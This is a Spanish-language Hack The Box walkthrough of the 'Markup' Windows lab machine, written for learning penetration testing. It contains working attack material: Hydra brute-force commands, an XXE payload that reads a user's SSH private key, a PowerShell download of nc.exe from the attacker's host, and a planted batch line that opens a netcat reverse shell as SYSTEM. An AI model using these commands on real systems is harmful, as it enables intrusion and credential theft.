
# HTB - Markup

## Machine Information

| Property             | Information                                               |
| -------------------- | --------------------------------------------------------- |
| Machine              | Markup                                                    |
| IP                   | 10.129.23.161                                             |
| OS                   | Windows                                                   |
| Difficulty           | Easy                                                      |
| Main Vulnerabilities | XXE, SSH Private Key Exposure, Scheduled Batch File Abuse |

# 1. Reconocimiento

Como siempre, comenzamos realizando un escaneo completo de puertos TCP.

```bash id="3j4x9n"
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.129.23.161 -oG AllPorts
```

Encontramos tres puertos abiertos:

```text id="m5h2q8"
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

Realizamos una enumeración más detallada de los servicios:

```bash id="f8n7c2"
nmap -sCV -p22,80,443 10.129.23.161
```

Los resultados principales fueron:

```text id="w3v9k1"
22/tcp  open  ssh
OpenSSH for_Windows_8.1

80/tcp  open  http
Apache httpd 2.4.41
PHP/7.2.28

443/tcp open  ssl/http
Apache httpd 2.4.41
PHP/7.2.28
```

El servidor web utiliza Apache sobre Windows y PHP 7.2.28.

También podemos observar que el servidor expone HTTPS en el puerto 443.

Un detalle interesante encontrado por Nmap es:

```text id="7q3m1f"
PHPSESSID: httponly flag not set
```

Esto significa que la cookie de sesión PHP no tiene configurado el atributo `HttpOnly`, aunque esto no será necesario para completar la máquina.

# 2. Enumeración Web

Accedemos al servidor web y encontramos una página de login.

Como primera prueba intentamos credenciales comunes:

```text id="v5p8k2"
admin:admin
admin:admin123
```

pero ninguna funcionó.

Para entender mejor cómo funciona el login, utilizamos Burp Suite y también podemos enviar directamente una petición mediante `curl`.

Por ejemplo:

```bash id="d2m8q6"
curl -d "username=test123&password=daniel" 10.129.23.161
```

La aplicación responde:

```text id="r7c4n1"
<script>alert("Wrong Credentials");document.location="/";</script>
```

Esto nos permite identificar que el formulario realiza una petición POST y que la cadena:

```text id="0v4p8s"
Wrong Credentials
```

puede utilizarse para distinguir entre un login incorrecto y una respuesta potencialmente válida.

# 3. Fuerza Bruta del Login

Como todavía no conocemos las credenciales, probamos Hydra contra el formulario.

Inicialmente utilizamos una lista de posibles credenciales:

```bash id="e9h3w7"
hydra -L /usr/share/seclists/Fuzzing/login_bypass.txt -P /usr/share/seclists/Fuzzing/login_bypass.txt 10.129.23.161 http-post-form "/:username=^USER^&password=^PASS^:Wrong Credentials"
```

Mientras Hydra estaba ejecutándose, continuamos con la enumeración del servidor web.

# 4. Enumeración de Directorios

Utilizamos Gobuster para buscar directorios y archivos interesantes.

```bash id="k6p2s4"
gobuster dir -u http://10.129.23.161/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

La aplicación utiliza PHP, algo que podemos identificar mediante herramientas como Wappalyzer.

Por el momento Gobuster no encuentra contenido especialmente interesante.

El único resultado relevante inicialmente fue:

```text id="u4f8c2"
images
```

pero no encontramos información útil dentro de él.

# 5. Obtención de Credenciales

Después de que la primera prueba no produjera resultados interesantes, decidimos centrarnos en el usuario `admin`.

Ejecutamos Hydra utilizando `admin` como usuario:

```bash id="a8m5x3"
hydra -l admin -P /usr/share/seclists/Fuzzing/login_bypass.txt 10.129.23.161 http-post-form "/:username=^USER^&password=^PASS^:F=Wrong Credentials" -v
```

Hydra finalmente encuentra unas credenciales válidas:

```text id="q2v7k9"
[80][http-post-form] host: 10.129.23.161
login: admin
password: password
```

Por lo tanto:

```text id="p1n6w3"
Username: admin
Password: password
```

Podemos iniciar sesión correctamente en la aplicación.

Una lección bastante sencilla de esta parte es que las credenciales por defecto también forman parte de la enumeración.

En este caso, `admin:password` era suficiente para acceder.

# 6. Enumeración de la Aplicación

Una vez autenticados, podemos explorar la aplicación.

Encontramos diferentes funcionalidades donde el usuario puede proporcionar información.

Entre ellas encontramos:

```text id="s8k4v2"
Orders
Contacts
```

La sección de Orders resulta especialmente interesante porque la aplicación envía los datos mediante XML.

Interceptamos la petición con Burp Suite.

La petición tiene la siguiente estructura:

```http id="c3x9m5"
POST /process.php HTTP/1.1
Host: 10.129.23.161
Content-Type: text/xml
Content-Length: 112
Origin: http://10.129.23.161
Connection: keep-alive
Referer: http://10.129.23.161/services.php
Cookie: PHPSESSID=dlm12490q9gots9tlf4722dm2n

<?xml version = "1.0"?>
<order>
    <quantity>123</quantity>
    <item>Home Appliances</item>
    <address>123</address>
</order>
```

Aquí encontramos una señal muy importante:

```text id="f6h2r8"
Content-Type: text/xml
```

La aplicación está procesando XML proporcionado por el usuario.

Esto nos hace pensar inmediatamente en una posible vulnerabilidad de XML External Entity.

# 7. XML External Entity

Una vulnerabilidad XXE, o XML External Entity, ocurre cuando un parser XML procesa entidades externas controladas por el atacante.

Si el parser permite entidades externas, podemos intentar hacer que el servidor lea archivos locales.

Por ejemplo, una estructura XXE puede utilizar:

```xml id="n4b8v2"
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

y posteriormente utilizar la entidad:

```xml id="q7m3x9"
&xxe;
```

El objetivo es conseguir que el contenido del archivo sea procesado y devuelto por la aplicación.

# 8. Identificando un Usuario

Inicialmente intentamos encontrar archivos interesantes mediante XXE.

Sin embargo, no obtuvimos información especialmente útil utilizando algunas de las rutas habituales.

Durante la enumeración del código HTML de la aplicación encontramos algo mucho más interesante.

La aplicación hacía referencia a un usuario llamado:

```text id="v5c8n2"
daniel
```

Esto nos proporciona un objetivo concreto para continuar la enumeración.

Sabemos que también existe SSH en el puerto 22:

```text id="j8q4m6"
22/tcp open ssh
OpenSSH for_Windows_8.1
```

Por lo tanto, una posibilidad interesante es buscar una clave privada SSH perteneciente a Daniel.

# 9. Lectura de la Clave SSH mediante XXE

Modificamos la petición XML para intentar leer la clave privada SSH de Daniel.

Utilizamos:

```xml id="r6w2p9"
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///c:/users/daniel/.ssh/id_rsa">
]>
<order>
    <item>&xxe;</item>
    <quantity></quantity>
    <address>hello</address>
</order>
```

La parte importante es:

```text id="c7m4x1"
file:///c:/users/daniel/.ssh/id_rsa
```

Estamos solicitando al parser XML que lea el archivo `id_rsa` del usuario Daniel.

La aplicación procesa la entidad y devuelve el contenido de la clave privada.

Obtenemos:

```text id="p9x3v7"
-----BEGIN OPENSSH PRIVATE KEY-----
```

seguido del contenido de la clave.

Esto confirma que la vulnerabilidad XXE nos permite leer archivos locales del sistema Windows.

# 10. Obtención de Acceso SSH

Ahora tenemos una clave privada RSA perteneciente a Daniel.

Guardamos la clave en un archivo, por ejemplo:

```text id="m2k8q4"
Daniel_rsa
```

Antes de utilizarla debemos modificar sus permisos.

SSH requiere que la clave privada no sea accesible por otros usuarios.

Utilizamos:

```bash id="x7v3n5"
chmod 600 Daniel_rsa
```

Los permisos quedan restringidos al propietario del archivo.

Después podemos utilizar la clave para conectarnos mediante SSH:

```bash id="f4q9m2"
ssh -i Daniel_rsa daniel@10.129.23.161
```

Conseguimos acceso:

```text id="j8c5v1"
Microsoft Windows [Version 10.0.17763.107]

daniel@MARKUP C:\Users\daniel>
```

Ahora tenemos acceso como:

```text id="z3m7k2"
daniel
```

sobre el sistema Windows.

# 11. User Flag

Una vez dentro del sistema podemos acceder al escritorio de Daniel:

```cmd id="q6x2p8"
cd C:\Users\daniel\Desktop
```

y listar los archivos:

```cmd id="w4m9c3"
dir
```

Encontramos:

```text id="n7v2k5"
user.txt
```

La leemos:

```cmd id="c8x3m6"
type user.txt
```

Obtenemos:

```text id="t2p9v4"
032d2fc8952a8c24e39c8f0ee9918ef7
```

Esta es la primera flag.

```text id="k5m8x2"
User Flag:
032d2fc8952a8c24e39c8f0ee9918ef7
```

# 12. Enumeración para Privilege Escalation

Ahora necesitamos escalar privilegios.

Durante la enumeración encontramos el directorio:

```text id="v8c2m5"
C:\Log-Management
```

Dentro encontramos:

```cmd id="j4n7x3"
dir
```

Resultado:

```text id="r5c8v2"
Directory of C:\Log-Management

03/12/2020  03:56 AM    <DIR>          .
03/12/2020  03:56 AM    <DIR>          ..
03/06/2020  02:42 AM               346 job.bat
```

Tenemos un archivo:

```text id="q7m3k9"
job.bat
```

Intentamos utilizar `file`, pero este comando no existe de forma nativa en CMD:

```cmd id="z2v6n8"
file job.bat
```

La respuesta es:

```text id="p4m9x1"
'file' is not recognized as an internal or external command,
operable program or batch file.
```

En Windows podemos utilizar `type` para leer el contenido:

```cmd id="c5n8v3"
type job.bat
```

El contenido es:

```batch id="m7x2q9"
@echo off
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
IF (%adminTest%)==(Access) goto noAdmin
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")
echo.
echo Event Logs have been cleared!
goto theEnd
:do_clear
wevtutil.exe cl %1
goto :eof
:noAdmin
echo You must run this script as an Administrator!
:theEnd
exit
```

El script comprueba si tiene permisos administrativos y, si los tiene, utiliza `wevtutil.exe` para limpiar los logs de eventos.

Esto es importante porque significa que existe un proceso que ejecuta este archivo con privilegios elevados.

# 13. Enumeración de Permisos

Debemos comprobar quién puede modificar el archivo.

Utilizamos:

```cmd id="h6v3p8"
icacls job.bat
```

Obtenemos:

```text id="y2m7c4"
job.bat BUILTIN\Users:(F)
        NT AUTHORITY\SYSTEM:(I)(F)
        BUILTIN\Administrators:(I)(F)
        BUILTIN\Users:(I)(RX)
```

La línea más importante es:

```text id="x8q3m6"
BUILTIN\Users:(F)
```

El grupo `Users` tiene permisos `Full Control` sobre `job.bat`.

Esto significa que nuestro usuario puede modificar el archivo.

Tenemos entonces una situación especialmente interesante:

```text id="n4v8k2"
Usuario Daniel
Permiso de modificación sobre job.bat
job.bat ejecutado con privilegios administrativos
```

Si podemos modificar el contenido del script y conseguimos que vuelva a ejecutarse con privilegios elevados, podemos convertir esto en una escalada de privilegios.

# 14. Preparando Netcat

Para obtener una shell con privilegios elevados podemos utilizar Netcat.

Primero descargamos `nc.exe` en el sistema Windows.

Desde nuestra máquina atacante iniciamos un servidor HTTP:

```bash id="b7x4m9"
python3 -m http.server 8000
```

Después intentamos descargar Netcat desde PowerShell.

Inicialmente utilizamos:

```powershell id="q3m8v5"
wget http://10.10.16.7/nc.exe -outfile nc.exe
```

El comando no funcionó como esperábamos.

Posteriormente utilizamos `Invoke-WebRequest`, que también puede abreviarse como `iwr`:

```powershell id="v6n2c8"
powershell iwr http://10.10.15.102/nc.exe -o nc.exe
```

Tampoco funcionó porque nuestro servidor estaba escuchando en el puerto 8000 y no en el puerto 80.

Finalmente corregimos la petición:

```powershell id="m4x8q1"
powershell iwr http://10.10.15.102:8000/nc.exe -o nc.exe
```

Ahora podemos descargar:

```text id="k7c3v9"
nc.exe
```

en:

```text id="p2m6x8"
C:\Log-Management
```

# 15. Modificando job.bat

Ahora que tenemos Netcat, podemos modificar `job.bat`.

La idea es aprovechar que:

```text id="s5v9m2"
BUILTIN\Users:(F)
```

nos permite modificar el archivo.

Queremos que el script ejecute Netcat y nos proporcione una shell.

Utilizamos:

```cmd id="x8m4q7"
echo C:\Log-Management\nc.exe -e cmd.exe 10.10.16.7 4444 > C:\Log-Management\job.bat
```

En el proceso inicial hubo un error al especificar el puerto, ya que una dirección IP y un puerto no deben separarse mediante `:` en los argumentos de Netcat.

La estructura correcta es:

```text id="n6v3c8"
nc.exe -e cmd.exe IP PUERTO
```

Por lo tanto:

```cmd id="j5q9m2"
echo C:\Log-Management\nc.exe -e cmd.exe 10.10.16.7 4444 > C:\Log-Management\job.bat
```

Ahora `job.bat` contiene nuestro comando.

# 16. Obtención de una Shell con Privilegios

Antes de que el script se ejecute, iniciamos nuestro listener:

```bash id="r8x2m5"
nc -lvnp 4444
```

Cuando `job.bat` vuelve a ejecutarse, el comando de Netcat se ejecuta dentro del contexto privilegiado del proceso.

Esto hace que la conexión llegue a nuestra máquina con privilegios elevados.

Obtenemos una shell como:

```text id="c4m7v2"
NT AUTHORITY\SYSTEM
```

En Windows, `NT AUTHORITY\SYSTEM` es una de las cuentas con mayor nivel de privilegios del sistema operativo.

Este es el equivalente conceptual de obtener root en Linux.

# 17. Root Flag

Una vez obtenida la shell como SYSTEM podemos acceder al escritorio del administrador:

```cmd id="v7n3m9"
cd C:\Users\Administrator\Desktop
```

Listamos los archivos:

```cmd id="k2x8q4"
dir
```

Encontramos:

```text id="m5v9c2"
root.txt
```

La leemos:

```cmd id="q8n3x6"
type root.txt
```

Obtenemos:

```text id="w4m7p2"
f574a3e7650cebd8c39784299cb570f8
```

Esta es la root flag.

```text id="z6c2n8"
Root Flag:
f574a3e7650cebd8c39784299cb570f8
```

# 18. Attack Path

La cadena completa de explotación fue:

```text
Puerto 80 y 443
Enumeración Web
Login
Credenciales admin:password
Enumeración de Orders
XML
XXE
Lectura de archivos locales
Lectura de id_rsa de Daniel
Clave privada SSH
Acceso SSH como Daniel
Enumeración local
C:\Log-Management\job.bat
Enumeración de permisos con icacls
BUILTIN\Users:(F)
Modificación de job.bat
Netcat
Reverse Shell
NT AUTHORITY\SYSTEM
Root Flag
```

# 19. Vulnerabilities & Techniques

Las principales vulnerabilidades y técnicas utilizadas fueron:

* Weak Credentials
* Directory and Web Enumeration
* XML External Entity
* Local File Disclosure through XXE
* SSH Private Key Exposure
* SSH Authentication using Private Key
* Sensitive Information Disclosure
* Insecure File Permissions
* Writable Batch File
* Privileged Script Execution
* Reverse Shell
* Windows Privilege Escalation
* NT AUTHORITY\SYSTEM

La vulnerabilidad más importante para obtener el acceso inicial fue XXE.

El servidor aceptaba XML controlado por el usuario y permitía definir entidades externas.

Esto permitió leer archivos arbitrarios del sistema Windows.

La información más importante que encontramos fue:

```text
C:\Users\daniel\.ssh\id_rsa
```

Con esta clave pudimos autenticarnos mediante SSH como Daniel.

Para la escalada de privilegios, el problema estaba en `job.bat`.

El archivo podía ser modificado por miembros del grupo `BUILTIN\Users`, pero el script era ejecutado dentro de un contexto administrativo.

Esto permitió reemplazar su contenido por un comando que iniciaba una conexión mediante Netcat.

Cuando el script fue ejecutado con privilegios elevados, nuestra conexión terminó siendo una shell como `NT AUTHORITY\SYSTEM`.

# 20. Lessons Learned

Esta máquina se me hizo bastante sencilla comparada con otras que he hecho.

La parte que más trabajo requirió fue nuevamente la enumeración.

Una vez encontrado el formulario que utilizaba XML, fue importante prestar atención a detalles aparentemente pequeños como:

```text
Content-Type: text/xml
```

Eso fue suficiente para pensar en XXE.

Después, la enumeración del HTML permitió encontrar el usuario `daniel`.

A partir de ahí, teniendo SSH abierto, buscar una clave privada en el directorio `.ssh` fue una opción lógica.

La parte de privilege escalation también demuestra la importancia de revisar los permisos de archivos.

El comando:

```cmd
icacls job.bat
```

mostró:

```text
BUILTIN\Users:(F)
```

y eso significaba que nuestro usuario podía modificar un archivo que posteriormente era ejecutado con privilegios elevados.

Esta máquina también reforzó algo que he mencionado en otros walkthroughs: considero que la enumeración es una de las partes más importantes del hacking.

No siempre necesitamos una vulnerabilidad extremadamente compleja.

Muchas veces la dificultad está en encontrar la pieza correcta que conecta varios elementos del sistema.

En esta máquina la cadena fue:

```text
XXE
id_rsa
SSH
job.bat
icacls
Netcat
SYSTEM
```

Actualmente estoy manteniendo la racha de Hack The Box con al menos una máquina por semana.

Llevo cinco semanas manteniendo la racha y, aunque todavía no he resuelto una cantidad enorme de máquinas, considero que he tenido un avance bastante grande.

También terminé un curso completo de SQL y bases de datos, cuyo proyecto planeo subir próximamente.

Además, voy a comenzar con C y continuar avanzando en las academias de S4vitar.

Por ahora estoy reforzando Python y posteriormente quiero continuar con hacking y Hack The Box a mayor intensidad.

Esta máquina fue principalmente una pincelada mientras continúo reforzando los fundamentos.

# PWNED!!!

```text
PWNED!!!
```

Nitblan
